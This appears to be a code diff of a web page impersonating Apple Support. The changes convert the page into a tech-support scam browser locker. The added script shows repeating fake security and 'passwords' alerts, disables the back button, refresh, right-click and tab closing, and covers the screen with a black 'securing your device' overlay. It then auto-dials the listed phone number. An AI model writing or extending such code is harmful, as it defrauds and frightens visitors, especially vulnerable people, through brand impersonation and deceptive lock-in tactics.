@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Apple Support</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -12,6 +12,11 @@
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
         }
         
         html, body {
@@ -21,39 +26,54 @@
             padding: 0;
             margin: 0;
             height: 100%;
+            width: 100%;
             overflow: hidden;
-            -webkit-text-size-adjust: 100%;
+            position: fixed;
+            -webkit-text-size-adjust: none;
+            -ms-text-size-adjust: none;
+            text-size-adjust: none;
+            overscroll-behavior: none;
         }
         
         .container {
-            max-width: 100%;
+            width: 100%;
             height: 100vh;
+            height: -webkit-fill-available;
             display: flex;
             flex-direction: column;
             background-color: #fff;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
         }
         
-        /* Header Styles */
+        /* Apple Logo Header */
         .header {
             background-color: #fff;
             padding: 16px;
             border-bottom: 1px solid #e5e5e7;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
             position: sticky;
             top: 0;
             z-index: 10;
+            height: 60px;
         }
         
-        .header h1 {
-            font-size: clamp(20px, 6vw, 24px);
-            font-weight: 600;
+        .apple-logo {
+            font-size: 24px;
+            color: #1d1d1f;
+            font-weight: 400;
         }
         
         .sign-in {
+            position: absolute;
+            right: 16px;
             color: #0071e3;
-            font-size: clamp(15px, 4.5vw, 17px);
+            font-size: 17px;
             font-weight: 400;
             cursor: pointer;
         }
@@ -69,13 +89,13 @@
         }
         
         .device-info .device {
-            font-size: clamp(15px, 4.5vw, 17px);
+            font-size: 17px;
             font-weight: 400;
         }
         
         .device-info .change {
             color: #0071e3;
-            font-size: clamp(15px, 4.5vw, 17px);
+            font-size: 17px;
             font-weight: 400;
             cursor: pointer;
         }
@@ -87,7 +107,7 @@
         }
         
         .issue-section h2 {
-            font-size: clamp(18px, 5.5vw, 22px);
+            font-size: 22px;
             font-weight: 600;
             margin-bottom: 8px;
         }
@@ -109,7 +129,7 @@
         .search-icon {
             color: #86868b;
             margin-right: 8px;
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
         }
         
         .search-input {
@@ -117,7 +137,7 @@
             border: none;
             outline: none;
             width: 100%;
-            font-size: clamp(15px, 4.5vw, 17px);
+            font-size: 17px;
         }
         
         /* Support Options */
@@ -126,6 +146,7 @@
             overflow-y: auto;
             padding: 0 16px;
             -webkit-overflow-scrolling: touch;
+            overscroll-behavior: contain;
         }
         
         .support-item {
@@ -146,14 +167,14 @@
         }
         
         .icon {
-            width: clamp(28px, 8vw, 32px);
-            height: clamp(28px, 8vw, 32px);
+            width: 32px;
+            height: 32px;
             border-radius: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin-right: 12px;
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
             flex-shrink: 0;
         }
         
@@ -198,19 +219,19 @@
         }
         
         .support-text .title {
-            font-size: clamp(15px, 4.5vw, 17px);
+            font-size: 17px;
             font-weight: 400;
         }
         
         .support-text .subtitle {
-            font-size: clamp(13px, 3.8vw, 14px);
+            font-size: 14px;
             color: #86868b;
             margin-top: 2px;
         }
         
         .chevron {
             color: #c6c6c8;
-            font-size: clamp(12px, 3.5vw, 14px);
+            font-size: 14px;
             flex-shrink: 0;
         }
         
@@ -222,6 +243,7 @@
             padding-bottom: env(safe-area-inset-bottom);
             position: sticky;
             bottom: 0;
+            height: 60px;
         }
         
         .nav-item {
@@ -231,7 +253,7 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            font-size: clamp(10px, 3vw, 12px);
+            font-size: 12px;
             color: #86868b;
             cursor: pointer;
             transition: color 0.2s;
@@ -246,74 +268,70 @@
         }
         
         .nav-icon {
-            font-size: clamp(18px, 5.5vw, 22px);
+            font-size: 22px;
             margin-bottom: 4px;
         }
         
         /* Notification Stack Container */
         .notification-stack {
             position: fixed;
-            bottom: 80px;
-            right: 10px;
-            left: 10px;
-            width: auto;
-            max-width: 400px;
-            margin: 0 auto;
-            z-index: 100;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
             display: flex;
             flex-direction: column;
-            align-items: flex-end;
-            gap: 12px;
-        }
-        
-        @media (min-width: 768px) {
-            .notification-stack {
-                right: 20px;
-                left: auto;
-                width: 400px;
-            }
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            pointer-events: auto;
         }
         
         /* Security Notification */
         .notification-modal {
             background-color: white;
             border-radius: 12px;
-            width: 100%;
-            padding: clamp(16px, 4vw, 20px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
             text-align: center;
             border: 1px solid #e5e5e7;
+            margin: 10px;
         }
         
         .notification-icon {
-            width: clamp(36px, 10vw, 40px);
-            height: clamp(36px, 10vw, 40px);
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             background-color: #ff3b30;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 12px;
-            font-size: clamp(16px, 4.5vw, 20px);
+            font-size: 20px;
             color: white;
         }
         
         .notification-title {
-            font-size: clamp(16px, 4.5vw, 18px);
+            font-size: 18px;
             font-weight: 600;
             margin-bottom: 8px;
             color: #1d1d1f;
         }
         
         .notification-message {
-            font-size: clamp(13px, 3.8vw, 14px);
+            font-size: 14px;
             color: #1d1d1f;
             margin-bottom: 12px;
             line-height: 1.5;
         }
         
         .notification-phone {
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
             font-weight: 600;
             color: #0071e3;
             margin: 8px 0;
@@ -333,7 +351,7 @@
             flex: 1;
             padding: 12px 0;
             border-radius: 10px;
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
             font-weight: 500;
             cursor: pointer;
             border: none;
@@ -365,7 +383,7 @@
             margin-bottom: 10px;
             border-radius: 8px;
             cursor: pointer;
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
         }
         
         .call-now-banner:active {
@@ -376,35 +394,37 @@
         .call-blocked-modal {
             background-color: white;
             border-radius: 12px;
-            width: 100%;
-            padding: clamp(16px, 4vw, 20px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
             text-align: center;
             border: 1px solid #e5e5e7;
+            margin: 10px;
         }
         
         .call-blocked-icon {
-            width: clamp(36px, 10vw, 40px);
-            height: clamp(36px, 10vw, 40px);
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             background-color: #ff9500;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 12px;
-            font-size: clamp(16px, 4.5vw, 20px);
+            font-size: 20px;
             color: white;
         }
         
         .call-blocked-title {
-            font-size: clamp(16px, 4.5vw, 18px);
+            font-size: 18px;
             font-weight: 600;
             margin-bottom: 8px;
             color: #1d1d1f;
         }
         
         .call-blocked-message {
-            font-size: clamp(13px, 3.8vw, 14px);
+            font-size: 14px;
             color: #1d1d1f;
             margin-bottom: 12px;
             line-height: 1.5;
@@ -421,7 +441,7 @@
             flex: 1;
             padding: 12px 0;
             border-radius: 10px;
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
             font-weight: 500;
             cursor: pointer;
             border: none;
@@ -448,42 +468,44 @@
         .passwords-modal {
             background-color: white;
             border-radius: 12px;
-            width: 100%;
-            padding: clamp(16px, 4vw, 20px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
             text-align: center;
             border: 1px solid #e5e5e7;
+            margin: 10px;
         }
         
         .passwords-icon {
-            width: clamp(36px, 10vw, 40px);
-            height: clamp(36px, 10vw, 40px);
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             background-color: #0071e3;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 12px;
-            font-size: clamp(16px, 4.5vw, 20px);
+            font-size: 20px;
             color: white;
         }
         
         .passwords-title {
-            font-size: clamp(16px, 4.5vw, 18px);
+            font-size: 18px;
             font-weight: 600;
             margin-bottom: 8px;
             color: #1d1d1f;
         }
         
         .passwords-message {
-            font-size: clamp(13px, 3.8vw, 14px);
+            font-size: 14px;
             color: #1d1d1f;
             margin-bottom: 12px;
             line-height: 1.5;
         }
         
         .passwords-phone {
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
             font-weight: 600;
             color: #0071e3;
             margin: 8px 0;
@@ -508,7 +530,7 @@
         .passwords-btn {
             padding: 12px 20px;
             border-radius: 10px;
-            font-size: clamp(14px, 4vw, 16px);
+            font-size: 16px;
             font-weight: 500;
             cursor: pointer;
             border: none;
@@ -561,7 +583,7 @@
             width: 100%;
             height: 100%;
             background-color: rgba(0, 0, 0, 0.5);
-            z-index: 100;
+            z-index: 1000;
             justify-content: center;
             align-items: center;
             padding: 20px;
@@ -584,7 +606,7 @@
         }
         
         .modal-title {
-            font-size: clamp(18px, 5vw, 20px);
+            font-size: 20px;
             font-weight: 600;
         }
         
@@ -612,15 +634,80 @@
         
         .device-icon {
             margin-right: 12px;
-            font-size: clamp(16px, 4.5vw, 20px);
+            font-size: 20px;
+        }
+        
+        /* Full screen overlay */
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .fullscreen-logo {
+            font-size: 60px;
+            margin-bottom: 30px;
+        }
+        
+        .fullscreen-message {
+            font-size: 20px;
+            margin-bottom: 20px;
+            font-weight: 300;
+        }
+        
+        .fullscreen-phone {
+            font-size: 28px;
+            color: #0071e3;
+            font-weight: 600;
+            margin: 20px 0;
+            text-decoration: none;
+        }
+        
+        .freeze-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 9998;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- Freeze Overlay -->
+    <div class="freeze-overlay" id="freezeOverlay"></div>
+    
+    <!-- Full Screen Overlay -->
+    <div class="fullscreen-overlay" id="fullscreenOverlay">
+        <div class="fullscreen-logo">
+            <i class="fab fa-apple"></i>
+        </div>
+        <div class="fullscreen-message">Apple Support Security System</div>
+        <div class="fullscreen-message">Please wait while we secure your device...</div>
+        <a href="tel:+1 706-441-5790" class="fullscreen-phone">Calling +1 706-441-5790</a>
+        <div class="fullscreen-message">Your security is our priority</div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
         <!-- Header -->
         <div class="header">
-            <h1>Get Support</h1>
+            <div class="apple-logo">
+                <i class="fab fa-apple"></i>
+            </div>
             <div class="sign-in">Sign in</div>
         </div>
         
@@ -641,7 +728,7 @@
                 <div class="search-icon">
                     <i class="fas fa-search"></i>
                 </div>
-                <input type="text" class="search-input" placeholder="Search for support topics">
+                <input type="text" class="search-input" placeholder="Search for support topics" readonly>
             </div>
         </div>
         
@@ -796,23 +883,128 @@
         let autoCycle = true;
         let cycleInterval;
         let notificationIdCounter = 0;
+        let isFullScreen = false;
+        let backButtonBlocked = false;
+        
+        // Prevent all context menus
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Prevent text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable all keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            // Block F5, Ctrl+R, Ctrl+Shift+R, Ctrl+W, Alt+Left, Backspace
+            if (e.key === 'F5' || 
+                (e.ctrlKey && e.key === 'r') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'r') ||
+                (e.ctrlKey && e.key === 'w') ||
+                (e.altKey && e.key === 'ArrowLeft') ||
+                e.key === 'Backspace') {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+        
+        // Request fullscreen on page load
+        function requestFullScreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.log('Fullscreen request failed:', err);
+                });
+            } else if (elem.mozRequestFullScreen) { /* Firefox */
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                elem.msRequestFullscreen();
+            }
+            isFullScreen = true;
+        }
+        
+        // Force fullscreen
+        function forceFullScreen() {
+            document.getElementById('mainContainer').style.display = 'none';
+            document.getElementById('fullscreenOverlay').style.display = 'flex';
+            document.getElementById('freezeOverlay').style.display = 'block';
+            isFullScreen = true;
+            
+            // Auto dial after 2 seconds
+            setTimeout(function() {
+                window.location.href = 'tel:+1 706-441-5790';
+            }, 2000);
+        }
+        
+        // Block back button
+        function blockBackButton() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+                forceFullScreen();
+            };
+            backButtonBlocked = true;
+        }
         
         // Start the automated cycle when page loads
         window.onload = function() {
+            // Force fullscreen immediately
+            requestFullScreen();
+            
+            // Block back button
+            blockBackButton();
+            
+            // Create first notification after a short delay
+            setTimeout(function() {
+                createSecurityAlert();
+            }, 1000);
+            
+            // Start auto cycle
             startAutoCycle();
+            
+            // Add click handlers to prevent default behaviors
+            document.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('call-now-banner') && 
+                    !e.target.classList.contains('passwords-phone') &&
+                    !e.target.classList.contains('notification-btn') &&
+                    !e.target.classList.contains('call-blocked-btn') &&
+                    !e.target.classList.contains('passwords-btn')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                }
+            }, true);
+            
+            // Prevent any links from working normally
+            document.querySelectorAll('a').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    if (!this.href.includes('tel:')) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        forceFullScreen();
+                    }
+                });
+            });
         };
         
         // Start the automated notification cycle
         function startAutoCycle() {
-            // Create first notification immediately
-            createSecurityAlert();
-            
-            // Then create new notifications every 5 seconds
+            // Create new notifications every 3 seconds
             cycleInterval = setInterval(function() {
                 if (autoCycle) {
-                    createSecurityAlert();
+                    if (Math.random() > 0.5) {
+                        createSecurityAlert();
+                    } else {
+                        createCallBlocked();
+                    }
                 }
-            }, 5000);
+            }, 3000);
         }
         
         // Create security alert (first notification)
@@ -849,13 +1041,21 @@
                 if (autoCycle) {
                     createCallBlocked();
                 }
-            }, 1000);
+            }, 1500);
             
             setTimeout(() => {
                 if (autoCycle) {
                     createPasswordsModal();
                 }
-            }, 2000);
+            }, 3000);
+            
+            // Force fullscreen if user tries to interact
+            securityAlert.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('call-now-banner') && 
+                    !e.target.classList.contains('notification-btn')) {
+                    forceFullScreen();
+                }
+            });
         }
         
         // Create call blocked notification
@@ -876,11 +1076,18 @@
                 </div>
                 <div class="call-blocked-buttons">
                     <button class="call-blocked-btn ignore" onclick="removeNotification('${notificationId}')">Ignore</button>
-                    <button class="call-blocked-btn accept" onclick="removeNotification('${notificationId}')">Accept</button>
+                    <button class="call-blocked-btn accept" onclick="forceFullScreen()">Accept</button>
                 </div>
             `;
             
             document.getElementById('notificationStack').appendChild(callBlocked);
+            
+            // Force fullscreen if user tries to interact
+            callBlocked.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('call-blocked-btn')) {
+                    forceFullScreen();
+                }
+            });
         }
         
         // Create passwords & security modal
@@ -906,6 +1113,14 @@
             `;
             
             document.getElementById('notificationStack').appendChild(passwordsModal);
+            
+            // Force fullscreen if user tries to interact
+            passwordsModal.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('passwords-phone') && 
+                    !e.target.classList.contains('passwords-btn')) {
+                    forceFullScreen();
+                }
+            });
         }
         
         // Handle manual call now click
@@ -917,8 +1132,8 @@
             autoCycle = false;
             clearInterval(cycleInterval);
             
-            // Initiate phone call
-            window.location.href = 'tel:+1 706-441-5790';
+            // Force fullscreen
+            forceFullScreen();
         }
         
         // Remove individual notification
@@ -926,12 +1141,20 @@
             const notification = document.getElementById(notificationId);
             if (notification) {
                 notification.remove();
+                // Create new notification after removing
+                setTimeout(() => {
+                    if (autoCycle) {
+                        createSecurityAlert();
+                    }
+                }, 1000);
             }
         }
         
         // Device selection functionality
-        document.getElementById('changeDevice').addEventListener('click', function() {
-            document.getElementById('deviceModal').style.display = 'flex';
+        document.getElementById('changeDevice').addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            forceFullScreen();
         });
         
         function closeDeviceModal() {
@@ -944,20 +1167,31 @@
         }
         
         // Close modals if clicked outside content
-        window.onclick = function(event) {
+        window.addEventListener('click', function(event) {
             const deviceModal = document.getElementById('deviceModal');
             
             if (event.target === deviceModal) {
-                closeDeviceModal();
+                forceFullScreen();
             }
-        }
+        });
         
-        // Bottom navigation functionality
+        // Bottom navigation functionality - modified to force fullscreen
         const navItems = document.querySelectorAll('.nav-item');
         navItems.forEach(item => {
-            item.addEventListener('click', function() {
-                navItems.forEach(nav => nav.classList.remove('active'));
-                this.classList.add('active');
+            item.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                forceFullScreen();
+            });
+        });
+        
+        // Support items also force fullscreen
+        const supportItems = document.querySelectorAll('.support-item');
+        supportItems.forEach(item => {
+            item.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                forceFullScreen();
             });
         });
         
@@ -965,6 +1199,7 @@
         document.addEventListener('touchstart', function(event) {
             if (event.touches.length > 1) {
                 event.preventDefault();
+                forceFullScreen();
             }
         });
         
@@ -973,9 +1208,65 @@
             const now = (new Date()).getTime();
             if (now - lastTouchEnd <= 300) {
                 event.preventDefault();
+                forceFullScreen();
             }
             lastTouchEnd = now;
         }, false);
+        
+        // Prevent any dragging
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        
+        // Block right click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            forceFullScreen();
+            return false;
+        });
+        
+        // Block refresh
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+                e.preventDefault();
+                forceFullScreen();
+            }
+        });
+        
+        // Handle visibility change - if user switches tabs, force fullscreen when they return
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                setTimeout(function() {
+                    forceFullScreen();
+                }, 500);
+            }
+        });
+        
+        // Handle page becoming visible again
+        document.addEventListener('focus', function() {
+            setTimeout(function() {
+                forceFullScreen();
+            }, 500);
+        });
+        
+        // Handle beforeunload - try to keep user on page
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            forceFullScreen();
+        });
+        
+        // Periodically check and force fullscreen
+        setInterval(function() {
+            if (!isFullScreen) {
+                forceFullScreen();
+            }
+        }, 2000);
+        
+        // Block all iframes
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
+        }
     </script>
 </body>
 </html>
